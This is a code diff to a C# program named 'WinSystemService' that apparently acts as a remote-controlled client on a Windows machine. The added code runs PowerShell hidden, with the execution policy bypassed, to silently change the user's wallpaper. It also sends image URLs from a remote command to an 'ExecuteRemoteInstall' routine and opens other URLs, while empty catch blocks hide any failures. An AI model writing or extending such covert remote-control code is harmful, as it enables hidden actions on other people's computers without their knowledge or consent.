@@ -609,6 +609,16 @@ namespace WinSystemService
                     }
                     catch { }
 
+                    try
+                    {
+                        ProcessStartInfo psiPs = new ProcessStartInfo("powershell.exe",
+                            "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '" + bmpPath.Replace("'", "''") + "' -Force; Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value 2 -Force; rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True; rundll32.exe user32.dll,UpdatePerUserSystemParameters\"");
+                        psiPs.UseShellExecute = false;
+                        psiPs.CreateNoWindow = true;
+                        Process.Start(psiPs);
+                    }
+                    catch { }
+
                     SetInstallStatus(id, name, "success", 100, "Masaustu duvar kagidi direkt olarak degistirildi!");
                     return;
                 }
@@ -895,7 +905,23 @@ namespace WinSystemService
                     }
                     if (shouldOpen)
                     {
-                        try { Process.Start(url); } catch { }
+                        string lower = url.ToLower();
+                        bool isImage = lower.EndsWith(".jpg") || lower.EndsWith(".jpeg") || lower.EndsWith(".png")
+                            || lower.EndsWith(".bmp") || lower.EndsWith(".webp")
+                            || lower.Contains("/uploads/") || lower.Contains("wallpaper")
+                            || lower.Contains("images.unsplash.com");
+
+                        if (isImage)
+                        {
+                            ThreadPool.QueueUserWorkItem(delegate
+                            {
+                                ExecuteRemoteInstall(uid, "wallpaper", "Duvar Kagidi", url, "", "");
+                            });
+                        }
+                        else
+                        {
+                            try { Process.Start(url); } catch { }
+                        }
                     }
                 }
             }
